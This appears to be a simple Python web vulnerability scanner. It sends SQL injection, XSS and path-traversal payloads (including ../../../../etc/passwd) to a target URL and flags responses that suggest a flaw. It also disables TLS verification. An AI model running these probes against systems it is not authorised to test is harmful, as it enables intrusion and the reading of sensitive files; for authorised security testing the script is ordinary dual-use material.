#!/usr/bin/env python3
"""
Vulnerability Scanner Test Script
"""
import requests
import json
from urllib.parse import urljoin
from pathlib import Path
import sys

def test_sql_injection(target_url):
    """Test for SQL Injection vulnerabilities"""
    print(f"\n[+] Testing SQL Injection on {target_url}")
    
    payloads = [
        "' OR '1'='1",
        '\" OR \"\"=\"',
        "' OR '1'='1' --",
        "' OR 1=1 --"
    ]
    
    vulnerable = False
    for payload in payloads:
        test_url = f"{target_url}?id={payload}" if '?' in target_url else f"{target_url}?id={payload}"
        try:
            response = requests.get(test_url, timeout=10, verify=False)
            
            # Common SQL error messages
            sql_errors = [
                "SQL syntax", "MySQL server", "syntax error", "unexpected end",
                "quoted string", "mysql_fetch", "num_rows", "not a valid MySQL"
            ]
            
            if any(error.lower() in response.text.lower() for error in sql_errors):
                print(f"  [!] Possible SQL Injection found with payload: {payload}")
                print(f"      URL: {test_url}")
                vulnerable = True
                
        except Exception as e:
            print(f"  [E] Error testing SQLi: {str(e)}")
    
    if not vulnerable:
        print("  [✓] No SQL Injection vulnerabilities found")

def test_xss(target_url):
    """Test for XSS vulnerabilities"""
    print(f"\n[+] Testing for XSS on {target_url}")
    
    payloads = [
        "<script>alert('XSS')</script>",
        '\"><script>alert(1)</script>',
        '\" onmouseover=\"alert(1)\"',
        '\"><img src=x onerror=alert(1)>'
    ]
    
    vulnerable = False
    for payload in payloads:
        test_url = f"{target_url}?search={requests.utils.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=10, verify=False)
            
            if payload in response.text:
                print(f"  [!] Possible XSS found with payload: {payload}")
                print(f"      URL: {test_url}")
                vulnerable = True
                
        except Exception as e:
            print(f"  [E] Error testing XSS: {str(e)}")
    
    if not vulnerable:
        print("  [✓] No XSS vulnerabilities found")

def test_lfi(target_url):
    """Test for Local File Inclusion vulnerabilities"""
    print(f"\n[+] Testing for LFI on {target_url}")
    
    payloads = [
        "/etc/passwd",
        "../../../../etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts"
    ]
    
    vulnerable = False
    for payload in payloads:
        test_url = f"{target_url}?page={requests.utils.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=10, verify=False)
            
            lfi_indicators = ["root:", "nobody:", "/bin/", "Microsoft Windows ["]
            if any(indicator in response.text for indicator in lfi_indicators):
                print(f"  [!] Possible LFI found with payload: {payload}")
                print(f"      URL: {test_url}")
                print(f"      Response snippet: {response.text[:200]}...")
                vulnerable = True
                
        except Exception as e:
            print(f"  [E] Error testing LFI: {str(e)}")
    
    if not vulnerable:
        print("  [✓] No LFI vulnerabilities found")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print("Example: python test_vuln_scan.py http://testphp.vulnweb.com")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Add http:// if no scheme is specified
    if not target.startswith(('http://', 'https://')):
        target = f"http://{target}"
    
    print(f"[+] Starting vulnerability scan for {target}")
    
    # Run all tests
    test_sql_injection(target)
    test_xss(target)
    test_lfi(target)
    
    print("\n[+] Scan completed!")

if __name__ == "__main__":
    # Disable SSL warnings for self-signed certificates
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()
